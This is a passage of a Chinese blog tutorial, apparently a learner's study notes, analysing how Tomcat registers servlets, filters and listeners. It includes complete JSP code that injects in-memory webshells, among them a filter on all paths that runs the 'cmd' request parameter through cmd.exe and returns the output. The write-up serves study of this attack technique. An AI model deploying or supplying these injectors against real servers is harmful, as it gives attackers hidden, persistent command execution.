alt="image-20240916172220190"></p><p>然后这就是整个注册的流程，但是这里并没有实例化我们写的Servlet类，因为它存在懒加载机制，需要我们去访问的时候才会创建实例，但如果我们自己动态在页面写就会走不到那个流程，需要我们直接将实例类放进去</p><p>现在知道所有流程我们就可以开始写内存马了，这里是根据组长的流程来写，比较简单</p><p>第一步找到standardContext，这也是最关键的一步，因为我们知道jsp里面是有request对象的，我们可以通过request对象来获取standardContext</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>System.out.println(servletContext);<br></code></pre></td></tr></table></figure><p>我们先看看request#getServletContext返回的对象</p><p><img src="https://cdn.clown2024.cn/202409161746714.png" alt="image-20240916174627626"></p><p>我们可以看到往里面第二层的context就是StandardContext，这里我们可以直接用反射来获取</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br></code></pre></td></tr></table></figure><p>然后后面的就比较简单了，按照我们前面分析的注册步骤即可，就是要注意一点我们要手动将servlet实例注册进去</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//2.获取wrapper然后添加</span><br><span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>wrapper.setServletClass(TestShell.class.getName());<br>   <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br><span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>standardContext.addChild(wrapper);<br><span class="hljs-comment">//4.添加映射</span><br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br></code></pre></td></tr></table></figure><p>然后这个servlet我们就简单的弹一个计算器，完整的jsp文件如下</p><p>addServlet.jsp</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestShell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br><span class="hljs-comment">//动态注册</span><br>    <span class="hljs-comment">//1.获取standardContext</span><br>        <span class="hljs-comment">//获取ApplicationContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    Field applicationContextField=servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br>        <span class="hljs-comment">//获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br>    <span class="hljs-comment">//2.获取wrapper然后添加</span><br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    wrapper.setName(<span class="hljs-string">&quot;TestShell&quot;</span>);<br>    wrapper.setServletClass(TestShell.class.getName());<br>        <span class="hljs-comment">//应对懒加载添加我们的实例化servlet</span><br>    wrapper.setServlet(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestShell</span>());<br>    <span class="hljs-comment">//3.将wrapper添加进standardContext</span><br>    standardContext.addChild(wrapper);<br>    <span class="hljs-comment">//4.添加映射</span><br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-string">&quot;TestShell&quot;</span>);<br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409161818833.png" alt="image-20240916181846766"></p><p><img src="https://cdn.clown2024.cn/202409161819095.png" alt="image-20240916181903999"></p><p>然后成功白屏弹计算器😋</p><p>而我们前面的demo我是直接用的文章里的，他这里就是用了一个随机路径和随机文件名的方式注册，然后直接用匿名类的形式进行实现化，然后直接将命令结果打印出来到网页</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Servlet</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Servlet</span>() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig servletConfig)</span> &#123;&#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> servletRequest.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>        &#123;<br>            <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;cmd /c &quot;</span> + cmd).getInputStream();<br>            <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in, <span class="hljs-string">&quot;GBK&quot;</span>).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>            servletResponse.setCharacterEncoding(<span class="hljs-string">&quot;GBK&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> servletResponse.getWriter();<br>            out.println(output);<br>            out.flush();<br>            out.close();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>他这里使用<code>cmd /c</code>来实现可以执行带有空格的命令，例如<code>echo 世界，你好！</code>；对于Linux系统，那就是<code>/bin/sh -c</code></p><blockquote><p>至于LoadOnStartUp这个玩意没发现他的作用暂时</p></blockquote><p><strong>关于实例化servlet的添加</strong></p><p>因为懒加载机制我们是在访问后才进行的实例化servlet，然后我就想探究一下这个servlet到底是在哪里被实例化然后添加到wrapper里面，但我调了很久也没有发现放进wrapper的地方</p><p><img src="https://cdn.clown2024.cn/202409192045616.png" alt="image-20240919204457080"></p><p>我这里找到的调用StandardWrapper#allocate()来实例化一个servlet，然后往下有个createFilterChain函数，他将servlet传递了进去，我就去看了一下</p><p><img src="https://cdn.clown2024.cn/202409192050093.png" alt="image-20240919205001955"></p><p>然后只有这里是将实例添加进了filterchain，此时我还是没看到如exp里面的要将servlet放进wrapper里面</p><p><img src="https://cdn.clown2024.cn/202409192054750.png" alt="image-20240919205426641"></p><p>最后执行到servlet的时候就是在doFilter方法里面调用servlet属性的service方法，然后到servlet的doGet方法里了</p><p>后来终于想通了，看代码太不细致还是漏了关键的地方，我在访问内存马页面之后再调试回到那个allocate方法里面，发现我们设置了实例之后他的判断逻辑就不同了</p><p><img src="https://cdn.clown2024.cn/202409192108171.png" alt="image-20240919210819062"></p><p>因为我们设置了instance，这部分的逻辑就被跳过了，然后就会到下面这里</p><p><img src="https://cdn.clown2024.cn/202409192109478.png" alt="image-20240919210910379"></p><p>直接返回我们设置的instance，然后再放进了filterchain里面，这就是为什么我们需要用wrapper.setServlet方法的原因</p><p>所以其实我在想如果能够获取filterChain的话直接添加效果应该也是一样的</p><h1 id="filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h1><p>这部分参考文章：<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/%EF%BC%8Chttps://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B/，https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p>写Filter内存马的步骤：</p><ul><li>获取StandardContext；</li><li>继承并编写一个恶意filter；</li><li>实例化一个FilterDef类，包装filter并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个FilterMap类，将我们的Filter和urlpattern相对应，使用addFilterMapBefore存放到StandardContext.filterMaps中；</li><li>通过反射获取filterConfigs，实例化一个<code>FilterConfig</code>（<code>ApplicationFilterConfig</code>）类，传入<code>StandardContext</code>与<code>filterDefs</code>，存放到filterConfig中。</li></ul><p>有关filter相关的内容可以看一下里面文章的总结。</p><h2 id="原理分析"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h2><p>这里开始先分析再写</p><p>filter我们知道就是servlet前的一个过滤器，所以我们只要实现一个filter并写恶意代码，然后添加进去即可</p><p><strong>了解一下有关filter的各个名词</strong></p><ul><li>FilterDefs：首先，需要定义过滤器FilterDef，存放这些FilterDef的数组被称为FilterDefs，每个FilterDef定义了一个具体的过滤器，包括描述信息、名称、过滤器实例以及class等。</li><li>FilterConfigs：是这些过滤器的具体配置实例，我们可以为每个过滤器定义具体的配置参数，以满足系统的需求。</li><li>FilterMaps：用于将FilterConfigs映射到具体的请求路径或其他标识上，这样系统在处理请求时就能够根据请求的路径或标识找到对应的FilterConfigs。</li><li>FilterChain：是由多个FilterConfigs组成的链式结构，它定义了过滤器的执行顺序，在处理请求时系统会按照FilterChain中的顺序依次执行每个过滤器，对请求进行过滤和处理。</li></ul><p><strong>访问网页前的filter添加</strong></p><p>同样的filter的添加也在我们之前说到的ContextConfig#configureContext里面</p><p><img src="https://cdn.clown2024.cn/202409161922576.png" alt="image-20240916192256483"></p><p>这里往context里面添加filterdef，具体代码如下</p><p><img src="https://cdn.clown2024.cn/202409161924392.png" alt="image-20240916192439333"></p><p>添加到一个hashMap里面，下面是filterDef的相关属性</p><p><img src="https://cdn.clown2024.cn/202409192131516.png" alt="image-20240919213120425"></p><p>有些属性是我们到时候创建的时候需要设置的</p><p><img src="https://cdn.clown2024.cn/202409161925478.png" alt="image-20240916192510416"></p><p>这里是添加filterMap进去，再看一下filterMap里相关的属性</p><p><img src="https://cdn.clown2024.cn/202409192133213.png" alt="image-20240919213313122"></p><p>这就是访问路由前的注册内容</p><p><strong>访问之后</strong></p><p>现在我们写一个filter类，然后断在doFilter方法，看一下执行的过程</p><blockquote><p>这里的chain.doFilter是一定要写的不然就走不到servlet那里了，因为遍历doFilter之后，最终是在servletService()方法中走到request</p></blockquote><p><img src="https://cdn.clown2024.cn/202409192135120.png" alt="image-20240919213506978"></p><p>观察一下他的调用栈，可以看到是从StandardWrapperValve#invoke过来的，我们去看一下</p><p><img src="https://cdn.clown2024.cn/202409170050633.png" alt="image-20240917005012554"></p><p>所以可以知道是在filterChain的doFilter方法里面执行我们的filter和servlet</p><p>然后在找一下filterChain是在哪创建的</p><p><img src="https://cdn.clown2024.cn/202409170052061.png" alt="image-20240917005252976"></p><p>可以看到是在这里，接下来重新下断点到这，看一下filterChain的创建</p><p><img src="https://cdn.clown2024.cn/202409192140374.png" alt="image-20240919214048265"></p><p>这里先创建了一个ApplicationFilterChain然后看能否从req中获取filterChain，不能就新建一个ApplicationFilterChain同时set给req，继续往下</p><p><img src="https://cdn.clown2024.cn/202409170101254.png" alt="image-20240917010128142"></p><p>然后就是获取standardContext再从中获取filterMaps，然后看一下现在filterMaps里面的内容</p><p><img src="https://cdn.clown2024.cn/202409192144379.png" alt="image-20240919214407244"></p><p>可以看到有有我们自己的那个FilterMap</p><p><img src="https://cdn.clown2024.cn/202409170106138.png" alt="image-20240917010647039"></p><p>接下来会遍历filterMaps 中的 filterMap的filterName，如果发现符合当前请求 url 与 filterMap 中的 urlPattern 匹配且通过filterName能找到对应的filterConfig，则会将其加入filterChain</p><p>那来看一下ApplicationFilterConfig的创建</p><p><img src="https://cdn.clown2024.cn/202409192148887.png" alt="image-20240919214844764"></p><p>可以看到从StandardContext的filterConfigs里面直接根据key获取ApplicationFilterConfig的实例</p><p>最后看一下filterConfig的内容</p><p><img src="https://cdn.clown2024.cn/202409192151525.png" alt="image-20240919215145392"></p><p>包含了filter实例和filterDef还有context这几个重要元素，到此filterChain创建完成，然后就是执行前面说的的doFilter方法</p><h2 id="内存马编写"><a href="#内存马编写" class="headerlink" title="内存马编写"></a>内存马编写</h2><p>前面分析可知，最重要的两个方法是**StandardContext.findFilterMaps()<strong>和</strong>StandardContext.findFilterConfig()**，我们只要往这2个属性里面插入对应的filterMap和filterConfig即可实现动态添加filter的目的，这些属性都在standardContext里面，那么standardContext里面是否也有添加这些属性的方法呢</p><p>这里standardContext提供了添加filterMap的方法<strong>addFilterMapBefore</strong></p><p><img src="https://cdn.clown2024.cn/202409170136347.png" alt="image-20240917013619268"></p><p>这里会先校验，然后再添加filterMap，跟进一下validateFilterMap方法</p><p><img src="https://cdn.clown2024.cn/202409170138616.png" alt="image-20240917013804538"></p><p>可以看到它会根据filterName去寻找对应的filterDef，如果没找到的话会直接抛出异常，也就是说我们还需要往filterDefs里添加filterDef。</p><p>关于filterDefs，StandardContext也直接提供了对应的添加方法addFilterDef</p><p><img src="https://cdn.clown2024.cn/202409170140748.png" alt="image-20240917014031687"></p><p>最后filterConfig并没有添加该属性的方法，需要我们通过反射获取属性进行修改</p><p><img src="https://cdn.clown2024.cn/202409170142816.png" alt="image-20240917014218759"></p><p>现在大部分的问题我们都解决了</p><p>下面是具体的代码实现</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Map&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Context&quot;</span> %&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br><br>%&gt;<br>&lt;%<br>    <span class="hljs-comment">// 获取StandardContext</span><br>    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">appctx</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    appctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) appctx.get(servletContext);<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">stdctx</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>    stdctx.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) stdctx.get(applicationContext);<br><br><br>    <span class="hljs-comment">// 创建一个filter实例</span><br>    Filter evilFilter=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Filter</span>() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>            <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/C&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                <span class="hljs-comment">//将命令回显写入到response里面去</span><br>                response.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//去执行doFilter方法</span><br>            chain.doFilter(request,response);<br>        &#125;<br>    &#125;;<br>    <span class="hljs-comment">// FilterDef</span><br>    <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>    filterDef.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterDef.setFilterClass(evilFilter.getClass().getName());<br>    <span class="hljs-comment">//这里估计也是在实例化filter的时候如果filterDef设置了就直接返回filter，因为调试的时候filterDef里面正常也是没有filter实例的</span><br>    filterDef.setFilter(evilFilter);<br>    <span class="hljs-comment">//添加FilterDef</span><br>    standardContext.addFilterDef(filterDef);<br><br>    <span class="hljs-comment">// FilterMap</span><br>    <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>    filterMap.setFilterName(<span class="hljs-string">&quot;clown&quot;</span>);<br>    filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>    filterMap.setDispatcher(DispatcherType.REQUEST.name());<br>    <span class="hljs-comment">//添加FilterMap</span><br>    standardContext.addFilterMapBefore(filterMap);<br><br>    <span class="hljs-comment">// 获取filterConfigs</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> standardContext.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>    Configs.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(standardContext);<br><br>    <span class="hljs-comment">//创建ApplicationFilterConfig</span><br>    <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>    constructor.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);<span class="hljs-comment">//将context和filterDef添加进去</span><br>    filterConfigs.put(<span class="hljs-string">&quot;clown&quot;</span>,filterConfig);<br><br>    out.print(<span class="hljs-string">&quot;Inject Success !&quot;</span>);<br><br><br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409170203799.png" alt="image-20240917020309726"></p><p><img src="https://cdn.clown2024.cn/202409192246438.png" alt="image-20240919224412807"></p><p>成功！</p><blockquote><p>还有exp中的这行代码filterMap.setDispatcher(DispatcherType.REQUEST.name());</p><p>我搜了一下它是定义了过滤器可以介入的几种请求类型。这些类型包括：</p><ul><li><code>REQUEST</code>：普通的客户端请求。</li><li><code>FORWARD</code>：通过 <code>RequestDispatcher</code> 转发的请求。</li><li><code>INCLUDE</code>：通过 JSP 包含指令包含的资源。</li><li><code>ERROR</code>：作为错误页面请求。</li></ul><p>所以这行代码不是必须的，删掉也一样可以</p><p>而且这行代码只支持Tomcat 7.x 以上，因为javax.servlet.DispatcherType 类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</p></blockquote><h1 id="listener内存马"><a href="#Listener内存马" class="headerlink" title="Listener内存马"></a>Listener内存马</h1><p>listener就是事件监听，java有很多中listener</p><p><img src="https://cdn.clown2024.cn/202409182314209.png" alt="image-20240918230547084"></p><p>大都是继承自EventListener接口，这里用ServletRequestListener，他有下面的两个方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.void requestInitialized(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象被创建并且还没有被使用之前被调用。这通常发生在一个 HTTP 请求到达 Servlet 容器，并且容器决定为该请求创建一个新的 ServletRequest 对象时。这个方法可以用来初始化请求相关的资源，比如设置请求属性或者启动跟踪请求状态的逻辑。<br><br>2.void requestDestroyed(ServletRequestEvent sre)：<br>这个方法在 Servlet 请求对象即将被销毁时被调用。这通常发生在请求处理完成，响应已经发送给客户端之后。这个方法可以用来清理请求相关的资源，比如关闭数据库连接或者清理在 requestInitialized 方法中创建的任何对象。<br></code></pre></td></tr></table></figure><p>可以写一个简单的demo测试一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servletshell;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;<br><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Listener 调用&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;servlet 离开&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>配置web.xml</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>org.clown.servletshell.ListenerTest<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>接下来就是照常分析一下Listener是怎么注册的了</p><p>这里直接从<strong>ContextConfig#configureContext</strong>那里开始分析，也就是访问前的过程</p><p>那就再去读取web.xml的那个地方看看</p><p><img src="https://cdn.clown2024.cn/202409191119893.png" alt="image-20240919111941724"></p><p>可以看到这里在添加filter之后就将listener的全类名进行添加，调用StandardContext#addApplicationListener方法</p><p>添加之后他会调用StandardContext#listenerStart</p><p><img src="https://cdn.clown2024.cn/202409191139786.png" alt="image-20240919113903688"></p><p>然后这里会查找我们添加的listener，到这步的代码比较复杂就不调了，有个数就行</p><p><strong>然后我们去访问网页</strong>，看一下请求过来时listener在哪里调用的</p><p><img src="https://cdn.clown2024.cn/202409191143445.png" alt="image-20240919114327349"></p><p>这里下个断点然后看看调用栈，看哪一个函数最重要</p><p><img src="https://cdn.clown2024.cn/202409191144058.png" alt="image-20240919114444926"></p><p>最重要的应该是这个函数StandardContext#fireRequestInitEvent</p><p>重新将断点下在这里看一看</p><p><img src="https://cdn.clown2024.cn/202409191151789.png" alt="image-20240919115146689"></p><p>可以看到它接受了request请求参数然后进行相关操作，然后这里获取一个listener数组</p><p>我们进该方法看看</p><p><img src="https://cdn.clown2024.cn/202409191155718.png" alt="image-20240919115507610"></p><p>可以看到applicationEventListenersList里面的就是我们的listener</p><p>而且StandardContext还有对应的添加listener的方法如下：</p><p><img 